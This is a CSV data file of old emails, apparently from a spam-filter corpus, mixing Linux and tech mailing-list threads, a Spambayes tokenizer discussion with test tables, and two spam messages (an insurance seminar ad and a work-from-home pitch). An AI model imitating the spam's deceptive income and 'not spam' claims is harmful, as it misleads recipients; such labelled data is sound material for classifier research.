id,subject,email
10,"Subject: Re: Goodbye Global Warming
","Mr. FoRK:
 >Of the three lying politicians, which liar would you take?
 
 No, no. The riddle is, asking only one question, how
 do you determine which is which? ""If I were to ask
 you whether he would say you were a crook, or if the
 other had sex ..?""
 
 
 
 
 
 _________________________________________________________________
 Send and receive Hotmail on your mobile device: http://mobile.msn.com
 
 
"
11,"Subject: linux.ie mailing list memberships reminder
","This is a reminder, sent out once a month, about your linux.ie mailing
 list memberships.  It includes your subscription info and how to use
 it to change it or unsubscribe from a list.
 
 You can visit the URLs to change your membership status or
 configuration, including unsubscribing, setting digest-style delivery
 or disabling delivery altogether (e.g., for a vacation), and so on.
 
 In addition to the URL interfaces, you can also use email to make such
 changes.  For more info, send a message to the '-request' address of
 the list (for example, webdev-request@linux.ie) containing just the
 word 'help' in the message body, and an email message will be sent to
 you with instructions.
 
 If you have questions, problems, comments, etc, send them to
 listmaster@tuatha.org.  Thanks!
 
 Passwords for jm-webdev@jmason.org:
 
 List                                     Password // URL
 ----                                     --------  
 webdev@linux.ie                          foo       
 http://www.linux.ie/mailman/options/webdev/jm-webdev@jmason.org
 
 
"
12,"Subject: Underwater high-voltage photography
","URL: http://boingboing.net/#85505975
 Date: Not supplied
 
 [IMG: http://www.craphound.com/images/electricball.jpg] Stefan sez: ""My 
 brother's friend Sue plays with high voltage. The linked-to page shows the 
 gadget she used to photograph high voltage discharges in *water*."" Link[1] 
 Discuss[2] (_Thanks, Stefan!_) 
 
 
 [1] http://community.webshots.com/album/8426665GzkjEytinE
 [2] http://www.quicktopic.com/boing/H/uzUstBTSpq7K
 
 
"
13,"Subject: When we say FREE, WE MEAN FREE!
","This is a multi-part message in MIME format.
 
 ------=_NextPart_000_295635_01C23C9D.8D2947A0
 Content-Type: text/plain;
 	charset=""Windows-1252""
 Content-Transfer-Encoding: quoted-printable
 
  When we say FREE Turnkey Selling System WE MEAN FREE!
 =20
  Get your demo disc today!=0A=
 No place to fly to, no meetings to attend!=09
 Total Turnkey System!	 High Quality Leads From
 Proven Mail Houses!	 Attractive Invitations With a=20
 2-3% Average Response!	=20
 Toll-free Reservation Hotline For Seminar Attendees!	 Nationally
 Tested - Compliance Approved Materials!	 Professional, Entertaining &
 Informative PowerPoint Presentations!	=20
 Free Multi-Media Loaner Equipment Including=20
 Lap-Top & Projector!	 Two Fool Proof Appointment Systems ? 50%
 Response Ratio!	 Free Full Two Days of Complete Training!	=20
 Continuous Coaching From
 Experienced Seminar Presenters!	 Attendance At Your Seminars By Your Own
 Seminar Coach!	 Large Range Of Top Companies & Products To Work With!
 
 NO Commission Reductions, Splits or Lower Contracts!	 Paid Premium
 Counts Towards Eligibility For
 5-Star, In-Season Trips!	 Co-op Dollars Available!	=20
   _____ =20
 
 Combine your Life, Annuity, LTC, DI & Securities=20
 Production And Have A ?Suite? Time On=20
 Our 7 - day All Suite Alaskan Adventure on Celebrity Cruises=AE
 >>From as little as $1,000,000 of Annuity Premium or $100,000 of Life
 Premium.
 No case minimums!*
 
   _____ =20
 
 Call or e-mail <mailto:seminarpartners@rosterfinancial.com>  us today
 for your FREE demo disc!
  800-933-6632x8
 ? or ?
 
 Please fill out the form below for more information	=20
 Name:	  =09
 E-mail:	  =09
 Phone:	  =09
 City:	  	State:	  	 =09
  	  	 	   =09
 =20
 
 =20
 *See Trip Brochure For Qualification Levels And Full Details.	=20
 We don't want anyone to receive our mailings who does not wish to. This
 is professional communication sent to insurance professionals. To be
 removed from this mailing list, DO NOT REPLY to this message. Instead,
 go here: http://www.Insurancemail.net <http://www.Insurancemail.net>=20
 
 Legal Notice <http://www.insuranceiq.com/legal.htm> =20
 
 ------=_NextPart_000_295635_01C23C9D.8D2947A0
 Content-Type: text/html;
 	charset=""iso-8859-1""
 Content-Transfer-Encoding: quoted-printable
 
 <html>
 <head>
 <title>When we say FREE, WE MEAN FREE!</title>
 <meta http-equiv=3D""Content-Type"" content=3D""text/html; =
 charset=3Diso-8859-1"">
 </head>
 <body bgcolor=3D""#FFFFFF"" text=3D""#000000"">
 <font face=3D""Arial, Helvetica, sans-serif"">
 <table width=3D""550"" cellpadding=3D""0"" cellspacing=3D""0"" =
 align=3D""center"" bgcolor=3D""#FFFFFF"" border=3D""1"" =
 bordercolor=3D""#000000"">
   <tr>=20
     <td><img src=3D""http://www.iiq.us/images/roster/20020618-101d.gif"" =
 width=3D""550"" height=3D""102"" alt=3D""When we say FREE Turnkey Selling =
 System WE MEAN FREE!""><br>
       <img src=3D""http://www.iiq.us/images/roster/20020618-102d.jpg"" =
 width=3D""550"" height=3D""161""><br>
       <img src=3D""http://www.iiq.us/images/roster/20020618-103d.gif"" =
 width=3D""550"" height=3D""67"" alt=3D""Get your demo disc today!&#10;No =
 place to fly to, no meetings to attend!""></td>
   </tr>
   <tr>=20
     <td>=20
       <table width=3D""100%"" cellpadding=3D""2"" cellspacing=3D""2"" =
 border=3D""0"">
         <tr>=20
           <td>=20
             <table width=3D""100%"" border=3D""1"" cellspacing=3D""0"" =
 cellpadding=3D""2"" bordercolor=3D""#000000"" bgcolor=3D""#FF9900"">
               <tr align=3D""center"">=20
                 <td width=3D""33%""><font size=3D""2"">Total Turnkey =
 System!</font></td>
                 <td width=3D""33%""><font size=3D""2"">High Quality Leads =
 From<br>Proven Mail Houses!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Attractive =
 Invitations With a <br>2-3% Average Response!</font></td>
               </tr>
               <tr align=3D""center"">=20
                 <td width=3D""33%""><font size=3D""2""> Toll-free =
 Reservation Hotline For Seminar Attendees!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Nationally Tested - =
 Compliance Approved Materials!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Professional, =
 Entertaining &amp; Informative PowerPoint Presentations!</font></td>
               </tr>
               <tr align=3D""center"">=20
                 <td width=3D""33%""><font size=3D""2"">Free Multi-Media =
 Loaner Equipment Including <br>Lap-Top &amp; Projector!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Two Fool Proof =
 Appointment Systems &#150; 50% Response Ratio!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Free Full Two Days of =
 Complete Training!</font></td>
               </tr>
               <tr align=3D""center"">=20
                 <td width=3D""33%""><font size=3D""2"">Continuous Coaching =
 From<br>Experienced Seminar Presenters!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Attendance At Your =
 Seminars By Your Own Seminar Coach!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Large Range Of Top =
 Companies &amp; Products To Work With!</font></td>
               </tr>
               <tr align=3D""center"">=20
                 <td width=3D""33%""><font size=3D""2"">NO Commission =
 Reductions, Splits or Lower Contracts!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Paid Premium Counts =
 Towards Eligibility For<br> 5-Star, In-Season Trips!</font></td>
                 <td width=3D""33%""><font size=3D""2"">Co-op Dollars =
 Available!</font></td>
               </tr>
             </table>
           </td>
         </tr>
         <tr>=20
           <td align=3D""center""><hr width=3D""98%"" size=3D""1"">
             <b><font face=3D""Verdana, Arial, Helvetica, sans-serif"" =
 size=3D""2"">
             Combine your Life, Annuity, LTC, DI &amp; Securities <br>
             Production And Have A &#147;Suite&#148; Time On</font></b> =
 <br>
             <font size=3D""4"" color=3D""#000099"">
             Our 7 - day All Suite Alaskan Adventure on Celebrity =
 Cruises&reg;</font><br>
             <font size=3D""2"">
             From as little as $1,000,000 of Annuity Premium or $100,000 =
 of Life Premium.<br>
             No case minimums!*</font><br>
             <hr width=3D""98%"" size=3D""1"">
           </td>
         </tr>
         <tr>=20
           <td align=3D""center"">
             <font size=3D""2""><b>Call or <a =
 href=3D""mailto:seminarpartners@rosterfinancial.com"">e-mail</a>=20
             us today for your FREE demo disc!<br>
             <img src=3D""http://www.iiq.us/images/roster/20020618-2.gif"" =
 width=3D""535"" height=3D""119"" alt=3D'800-933-6632x8'><br>
             &#151; or &#151;</b></font><br>
             <table width=3D""95%"" bgcolor=3D""#000000"">
               <tr>=20
                 <form method=3D""post"" =
 action=3D""http://65.217.159.103/response/response.asp"">
                   <td>=20
                     <table width=3D""100%"" border=3D""0"" cellspacing=3D""0"" =
 cellpadding=3D""2"" align=3D""center"" bgcolor=3D""#cccccc"">
                       <tr>=20
                         <td colspan=3D""5"" align=3D""center"" =
 bgcolor=3D""#000000""><b><font size=3D""2"" color=3D""#FFFFFF"">Please fill =
 out the form below for more information</font></b></td>
                       </tr>
                       <tr>=20
                         <td width=3D""15%"" align=3D""right""><b><font =
 size=3D""2"">Name:</font></b></td>
                         <td colspan=3D""4"">=20
                           <input type=3D""text"" name=3D""contactname"" =
 size=3D""50"">
                         </td>
                       </tr>
                       <tr>=20
                         <td width=3D""15%"" align=3D""right""><b><font =
 size=3D""2"">E-mail:</font></b></td>
                         <td colspan=3D""4"">=20
                           <input type=3D""text"" name=3D""email"" =
 size=3D""50"">
                         </td>
                       </tr>
                       <tr>=20
                         <td width=3D""15%"" align=3D""right""><b><font =
 size=3D""2"">Phone:</font></b></td>
                         <td colspan=3D""4"">=20
                           <input type=3D""text"" name=3D""phone"" =
 size=3D""50"">
                         </td>
                       </tr>
                       <tr>=20
                         <td width=3D""15%"" align=3D""right""><b><font =
 size=3D""2"">City:</font></b></td>
                         <td width=3D""30%"">=20
                           <input type=3D""text"" name=3D""city"" =
 size=3D""20"">
                         </td>
                         <td width=3D""15%"" align=3D""right""><b><font =
 size=3D""2"">State:</font></b></td>
                         <td width=3D""20%"">=20
                           <input type=3D""text"" name=3D""state"" =
 size=3D""2"">
                         </td>
                         <td rowspan=3D""2"" align=3D""center"" =
 valign=3D""middle""><img src=3D""http://iiq.us/images/q.gif"" width=3D""43"" =
 height=3D""50""></td>
                       </tr>
                       <tr>=20
                         <td width=3D""15%"" align=3D""right"">&nbsp;</td>
                         <td width=3D""30%"">=20
                           <input type=3D""submit"" name=3D""btnsubmit"" =
 value=3D""Submit"">
                         </td>
                         <td width=3D""15%"" align=3D""right"">&nbsp;</td>
                         <td width=3D""20%"">=20
                           <input type=3D""hidden"" =
 name=3D""hdnRecipientTxt"" value=3D""seminarpartners@rosterfinancial.com"">
                           <input type=3D""hidden"" name=3D""hdnSubjectTxt"" =
 value=3D""Roster Seminar Ad Inquiry"">
                         </td>
                       </tr>
                     </table>
                   </td>
                 <input type=3D'hidden' name=3D'SentTo' value=3D'304704'>
 </form>
               </tr>
             </table>
             <br>
             <img src=3D""http://www.iiq.us/images/roster/20020423-5.gif"" =
 height=3D""81"" width=3D""339"">=20
           </td>
         </tr>
         <tr>
           <td align=3D""center""><font size=3D""1"">*See Trip Brochure For =
 Qualification Levels And Full Details.</font></td>
         </tr>
       </table>
     </td>
   </tr>
   <tr>=20
     <td width=3D""100%"" bgcolor=3D""#cccccc"" align=3D""center"">=20
       <p><font face=3D""Arial, Helvetica, sans-serif"" size=3D""1""> We =
 don't want anyone=20
         to receive our mailings who does not wish to. This is =
 professional communication=20
         sent to insurance professionals. To be removed from this mailing =
 list,=20
         <b>DO NOT REPLY</b> to this message. Instead, go here: <a =
 href=3D""http://www.Insurancemail.net"">=20
         http://www.Insurancemail.net</a></font></p>
     </td>
   </tr>
 </table></font>
 <center>
   <font face=3D""Arial, Helvetica, sans-serif"" size=3D""1""><a =
 href=3D""http://www.insuranceiq.com/legal.htm"">Legal Notice</a></font>=20
 </center>
 </body>
 </html>
 
 ------=_NextPart_000_295635_01C23C9D.8D2947A0--
 
 
"
14,"Subject: Re: Quick, Outlaw Touching
","Hello Tom,
 
 Monday, October 7, 2002, 4:45:02 PM, you wrote:
 
 
 T> I know I heard of this a few years back but Wired and Slashyrot are both
 T> running stories on 10mbs data transfer via human touch.
 
 T> Oh I can see it now, The first bicostal file exchange system that will see
 T> the newsest Offspring tunes distribute by handshake, copulation and
 T> moshpiting.
 
 T> http://www.newscientist.com/news/news.jsp?id=ns99992891
 T> http://www.news.com.au/common/story_page/0,4057,5239758%255E13762,00.html
 T> http://slashdot.org/articles/02/10/07/0238234.shtml?tid=100
 
 
 
 Wow.  I'm just wondering how the earliest adopter of all new
 technologies, the porn market will spin this one...
 
  ""New... Now you can transfer porn while you screw!'  Talk about
  exchanging energy.
 
 -- 
 Best regards,
  bitbitch                            mailto:bitbitch@magnesium.net
 
 
"
15,"Subject: Re: [ILUG] SUSE 8 disks? (thread changed slightly)
","Quoting Paul Linehan (plinehan@yahoo.com):
 
 > I'm confused. I thought it was GPL'ed and that the money you paid SuSE
 > was for your 60 day support or whatever? 
 
 Yes, you're confused.
 
 A Linux distribution (_any_ Linux distribution) contains lots and lots
 of separate codebases.  Some are under the GNU GPL.  Many are not.  Are
 you clear on this point, now?  This is my second try.  One suspects that
 you actually understand perfectly, but just don't like it.
 
 You're further confused if you think the GNU GPL gives you the right to
 get covered software for free.  It does not.  It provides that _if_
 you've lawfully received a copy of the covered binary version, you have
 rights to also receive the matching source code.
 
 > I don't particularly need support, so I'm not really interested in
 > purchasing a set of disks with 4 billion apps which I'll never use.
 
 Then, if you nonetheless want a SuSE boxed set's contents, the only way
 you can do that without copyright violation _and_ without having to pay
 the purchase price is to get someone to _give_ (not ""lend"" or duplicate) 
 you his copy.
 
 > Yes, thanks for your input. Anyway, I've a friend with 7.3 pro, so
 > I'll just ask him.
 
 Ask him _what_?  If you're asking him to ""lend"" or duplicate his CDs,
 then you'll be ripping off SuSE Linux AG illegally.
 
 Don't like SuSE's product licensing?  Write your own distribution.  You
 can even grab most of what you need _from SuSE_.  All you have to do is 
 heed the licensing terms on the individual pieces.
 
 What, you think that's too much work?  Then, try a different
 distribution.  Clue:  _Not_ one packaged in a retail boxed set.  Even RH
 7.3 retail boxed sets include non-freely redistributable applications on
 the Star office 5.2 CD and the Productivity Applications CD, among
 others.  (The core 3-CD set of the basic RH distribution, on the other
 hand, contains only software that may be freely redistributed, whether 
 open source or not.)
 
 -- 
 Hi! I'm a .signature virus! Copy me into your ~/.signature  to help me spread.
 Hi!p I'm a .signature spread virus! Copy into your ~/.signature to help me
 Hilp I'm .sign turepread virus! into your ~/.signature! help me! Copy
 Help I'm traped in your ~/signature help me!       -- Joe Slater
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
16,"Subject: [zzzzteana] Re: Australian Catholic Kiddie Perv Steps Aside
","--- In forteana@y..., ""D.McMann"" <dmcmann@b...> wrote:
 > Robert Moaby, 33, who sent death threats to staff, was also jailed
 > for hoarding indecent pictures of children on his home computer.
 > =========
 > 
 > Hmm, if I didn't trust our government and secret police, I could 
 look at
 > this another way....
 
 There is a bit of circumstantial evidence - apparently some MT 
 listers were approached by him (via email) - a little research in 
 dejanews/google groups showed a number of messages from him, clearly 
 hoping to contact girls, appearing in ""alt.teens"" and similar groups -
  I just tried a Google Groups search on ""Robert Moaby"" and some of 
 them came top of the list.
 
 Note for Marie - ""MT"" stands for Mark Thomas, a slightly slimmer, UK 
 version of your Michael Moore - the mailing list is named after him. 
 
 Rob
 
 
 ------------------------ Yahoo! Groups Sponsor ---------------------~-->
 4 DVDs Free +s&p Join Now
 http://us.click.yahoo.com/pt6YBB/NXiEAA/mG3HAA/7gSolB/TM
 ---------------------------------------------------------------------~->
 
 To unsubscribe from this group, send an email to:
 forteana-unsubscribe@egroups.com
 
  
 
 Your use of Yahoo! Groups is subject to http://docs.yahoo.com/info/terms/ 
 
 
 
"
17,"Subject: Re: alsa-driver.spec tweak for homemade kernels
","Once upon a time, Gary wrote :
 
 > On Wed, Oct 02, 2002 at 10:09:19AM +0200, Matthias Saou wrote:
 > > Well, I don't really find it consistent at all to use an rpm package
 > > built against something that wasn't installed through rpm :-/
 > 
 > Following that reasoning, I've been installing all my custom-built
 > kernels through rpm recently. I find it annoying, though, that 
 > alsa-kernel, and similar packages, will only build for the currently 
 > running kernel.
 > 
 > So I've attached a patch to specify an alternate kernel by setting the
 > ""TARGET_KERNEL"" environment variable before running rpmbuild. You
 > still need to have the rpm for the specified kernel installed, but at
 > least it doesn't have to be currently running. It's kinda hackish, so
 > if someone has a better way to do this, let me know.
 
 That idea looks good although it maybe needs to be tweaked a bit more (what
 you sent doesn't support packages named ""kernel-smp""). I'd also prefer a
 cleaner way than the env variable, and preferrably not editing the spec...
 probably ""--define 'target 2.4.xx-xx' --with smp"". Sound good enough?
 The BuildRequires on ""kernel-source"" will also need to be removed because
 it won't necessarily need to be true, and that does bug me a bit :-/
 
 More ideas are welcome.
 Matthias
 
 -- 
 Clean custom Red Hat Linux rpm packages : http://freshrpms.net/
 Red Hat Linux release 7.3 (Valhalla) running Linux kernel 2.4.18-10acpi
 Load : 0.08 0.06 0.03
 
 _______________________________________________
 RPM-List mailing list <RPM-List@freshrpms.net>
 http://lists.freshrpms.net/mailman/listinfo/rpm-list
 
 
"
18,"Subject: RE: [ILUG] cheap linux PCs
","Actually, I'd be more inclined to look into:
 
 http://www.theregister.co.uk/content/54/27489.html
 
 Avoiding giving any cash to a certain corporation <g>
 
 P
 
 > -----Original Message-----
 > >I'd normally never buy this but the Xbox is Eur300 on IOL's shop, a very
 > >large company are making a loss on it and:
 > >
 > >http://xbox-linux.sourceforge.net/articles.php?aid=1&sub=Press%20Release%
 > 3A%20Xbox%20Linux%20Mandrake%209%20Released
 > >
 > >Mandrake has been released for it.
 > 
 > isn't it 250 in Smyths?
 > 
 > don't forget to add to that the modchip, and the time to put it on.
 > 
 > (/me thinks unless you want 3d graphics, www.mini-itx.com is the way to go
 > :))
 > 
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
19,"Subject: Be Your Own Boss!!                         13986
","
 <HTML><FONT  BACK=""#ffffff"" style=""BACKGROUND-COLOR: #ffffff"" SIZE=2 PTSIZE=10><BR>
                  FOLLOW ME TO FINANCIAL FREEDOM!!<BR>
 <BR>
 I Am looking for people with good work ethic and extrordinary desire<BR>
  to earn at least $10,000 per month working from home!<BR>
 <BR>
 NO SPECIAL SKILLS OR EXPERIENCE REQUIRED We will give you all the <BR>
 training and personal support you will need to ensure your success!<BR>
 <BR>
 This LEGITIMATE HOME-BASED INCOME OPPORTUNITY can put you back in<BR>
                control of your time,your finances,and your life!<BR>
 <BR>
 If you've tried other opportunities in the past that have failed to <BR>
                live up their promises,<BR>
 <BR>
      THIS IS DIFFERENT THEN ANYTHING ELSE YOU'VE SEEN!<BR>
 <BR>
        THIS IS NOT A GET RICH QUICK SCHEME!<BR>
 <BR>
 YOUR FINANCIAL PAST DOES NOT HAVE TO BE YOUR FINANCIAL FUTURE!<BR>
 <BR>
                CALL ONLY IF YOU ARE SERIOUS!<BR>
 <BR>
                  1-800-345-9708 <BR>
 <BR>
     DONT GO TO SLEEP WITHOUT LISTENING TO THIS!<BR>
 <BR>
 ""ALL our dreams can come true- if we have the courage to persue them""<BR>
                    -Walt Disney<BR>
 <BR>
 Please Leave Your Name And Number And Best Time To Call<BR>
 <BR>
                DO NOT RESPOND BY EMAIL<BR>
 <BR>
 This is not a SPAM. You are receiving this because<BR>
 you are on a list of email addresses that I have bought.<BR>
 And you have opted to receive information about<BR>
 business opportunities. If you did not opt in to receive<BR>
 information on business opportunities then please accept <BR>
 our apology. To be REMOVED from this list simply reply <BR>
 with REMOVE as the subject. And you will NEVER receive <BR>
 another email from me.</FONT></HTML>
 
 
 
"
20,"Subject: [Spambayes] test sets?
","[Guido]
 > I *meant* to say that they were 0.99 clues cancelled out by 0.01
 > clues.  But that's wrong too!  It looks I haven't grokked this part of
 > your code yet; this one has way more than 16 clues, and it seems the
 > classifier basically ended up counting way more 0.99 than 0.01 clues,
 > and no others made it into the list.  I thought it was looking for
 > clues with values in between; apparently it found none that weren't
 > exactly 0.5?
 
 There's a brief discussion of this before the definition of
 MAX_DISCRIMINATORS.  All clues with prob MIN_SPAMPROB and MAX_SPAMPROB are
 saved in min and max lists, and all other clues are fed into the nbest heap.
 Then the shorter of the min and max lists cancels out the same number of
 clues in the longer list.  Whatever remains of the longer list (if anything)
 is then fed into the nbest heap too, but no more than MAX_DISCRIMINATORS of
 them.  In no case do more than MAX_DISCRIMINATORS clues enter into the final
 probability calculation, but all of the min and max lists go into the list
 of clues (else you'd have no clue that massive cancellation was occurring;
 and massive cancellation may yet turn out to be a hook to signal that manual
 review is needed).  In your specific case, the excess of clues in the longer
 MAX_SPAMPROB list pushed everything else out of the nbest heap, and that's
 why you didn't see anything other than 0.01 and 0.99.
 
 Before adding these special lists, the outcome when faced with many 0.01 and
 0.99 clues was too often a coin toss:  whichever flavor just happened to
 appear MAX_DISCRIMINATORS//2 + 1 times first determined the final outcome.
 
 >> That sure sets the record for longest list of cancelling extreme clues!
 
 > This happened to be the longest one, but there were quite a few
 > similar ones.
 
 I just beat it <wink>:  a tokenization scheme that folds case, and ignores
 punctuation, and strips a trailing 's' from words, and saves both word
 bigrams and word unigrams, turned up a low-probability very long spam with a
 list of 410 0.01 clues and 125 0.99 clues!  Yikes.
 
 > I wonder if there's anything we can learn from looking at the clues and
 the
 > HTML.  It was heavily marked-up HTML, with ads in the sidebar, but the
 body
 > text was a serious discussion of ""OO and soft coding"" with lots of highly
 > technical words as clues (including Zope and ZEO).
 
 No matter how often it says Zope, it gets only one 0.01 clue from doing so.
 Ditto for ZEO.  In contrast, HTML markup has many unique ""words"" that get
 0.99.  BTW, this is a clear case where the assumption of
 conditionally-independent word probabilities is utterly bogus -- e.g., the
 probability that ""<body>"" appears in a message is highly correlated with the
 prob of ""<br>"" appearing.  By treating them as independent, naive Bayes
 grossly misjudges the probability that both appear, and the only thing you
 get in return is something that can actually be computed <wink>.
 
 Read the ""What about HTML?"" section in tokenizer.py.  From the very start,
 I've been investigating what would work best for the mailing lists hosted at
 python.org, and HTML decorations have so far been too strong a clue to
 justify ignoring it in that specific context.  I haven't done anything
 geared toward personal email, including the case of non-mailing-list email
 that happens to go through python.org.
 
 I'd prefer to strip HTML tags from everything, but last time I tried that it
 still had bad effects on the error rates in my corpora (the full test
 results with and without HTML tag stripping is included in the ""What about
 HTML?"" comment block).  But as the comment block also says,
 
 # XXX So, if another way is found to slash the f-n rate, the decision here
 # XXX not to strip HTML from HTML-only msgs should be revisited.
 
 and we've since done several things that gave significant f-n rate
 reductions.  I should test that again now.
 
 > Are there any minable-but-unmined header lines in your corpus left?
 
 Almost all of them -- apart from MIME decorations that appear in both
 headers and bodies (like Content-Type), the *only* header lines the base
 tokenizer looks at now are Subject, From, X-Mailer, and Organization.
 
 > Or do we have to start with a different corpus before we can make
 > progress there?
 
 I would need different data, yes.  My ham is too polluted with Mailman
 header decorations (which I may or may not be able to clean out, but fudging
 the data is a Mortal Sin and I haven't changed a byte so far), and my spam
 too polluted with header clues about the fellow who collected it.  In
 particular I have to skip To and Received headers now, and I suspect they're
 going to be very valuable in real life (for example, I don't even catch
 ""undisclosed recipients"" in the To header now!).
 
 > ...
 > No, sorry.  These were all of the following structure:
 >
 >   multipart/mixed
 >       text/plain        (brief text plus URL(s))
 >       text/html         (long HTML copied from website)
 
 Ah!  That explains why the HTML tags didn't get stripped.  I'd again offer
 to add an optional argument to tokenize() so that they'd get stripped here
 too, but if it gets glossed over a third time that would feel too much like
 a loss <wink>.
 
 >> This seems confused: Jeremy didn't use my trained classifier pickle,
 >> he trained his own classifier from scratch on his own corpora.
 >> ...
 
 > I think it's still corpus size.
 
 I reported on tests I ran with random samples of 220 spams and 220 hams from
 my corpus (that means training on sets of those sizes as well as predicting
 on sets of those sizes), and while that did harm the error rates, the error
 rates I saw were still much better than Jeremy reported when using 500 of
 each.
 
 
 Ah, a full test run just finished, on the
 
    tokenization scheme that folds case, and ignores punctuation, and strips
 a
    trailing 's' from words, and saves both word bigrams and word unigrams
 
 This is the code:
 
             # Tokenize everything in the body.
             lastw = ''
             for w in word_re.findall(text):
                 n = len(w)
                 # Make sure this range matches in tokenize_word().
                 if 3 <= n <= 12:
                     if w[-1] == 's':
                         w = w[:-1]
                     yield w
                     if lastw:
                         yield lastw + w
                     lastw = w + ' '
 
                 elif n >= 3:
                     lastw = ''
                     for t in tokenize_word(w):
                         yield t
 
 where
 
     word_re = re.compile(r""[\w$\-\x80-\xff]+"")
 
 This at least doubled the process size over what's done now.  It helped the
 f-n rate significantly, but probably hurt the f-p rate (the f-p rate is too
 low with only 4000 hams per run to be confident about changes of such small
 *absolute* magnitude -- 0.025% is a single message in the f-p table):
 
 false positive percentages
     0.000  0.000  tied
     0.000  0.075  lost  +(was 0)
     0.050  0.125  lost  +150.00%
     0.025  0.000  won   -100.00%
     0.075  0.025  won    -66.67%
     0.000  0.050  lost  +(was 0)
     0.100  0.175  lost   +75.00%
     0.050  0.050  tied
     0.025  0.050  lost  +100.00%
     0.025  0.000  won   -100.00%
     0.050  0.125  lost  +150.00%
     0.050  0.025  won    -50.00%
     0.050  0.050  tied
     0.000  0.025  lost  +(was 0)
     0.000  0.025  lost  +(was 0)
     0.075  0.050  won    -33.33%
     0.025  0.050  lost  +100.00%
     0.000  0.000  tied
     0.025  0.100  lost  +300.00%
     0.050  0.150  lost  +200.00%
 
 won   5 times
 tied  4 times
 lost 11 times
 
 total unique fp went from 13 to 21
 
 false negative percentages
     0.327  0.218  won    -33.33%
     0.400  0.218  won    -45.50%
     0.327  0.218  won    -33.33%
     0.691  0.691  tied
     0.545  0.327  won    -40.00%
     0.291  0.218  won    -25.09%
     0.218  0.291  lost   +33.49%
     0.654  0.473  won    -27.68%
     0.364  0.327  won    -10.16%
     0.291  0.182  won    -37.46%
     0.327  0.254  won    -22.32%
     0.691  0.509  won    -26.34%
     0.582  0.473  won    -18.73%
     0.291  0.255  won    -12.37%
     0.364  0.218  won    -40.11%
     0.436  0.327  won    -25.00%
     0.436  0.473  lost    +8.49%
     0.218  0.218  tied
     0.291  0.255  won    -12.37%
     0.254  0.364  lost   +43.31%
 
 won  15 times
 tied  2 times
 lost  3 times
 
 total unique fn went from 106 to 94
 
"
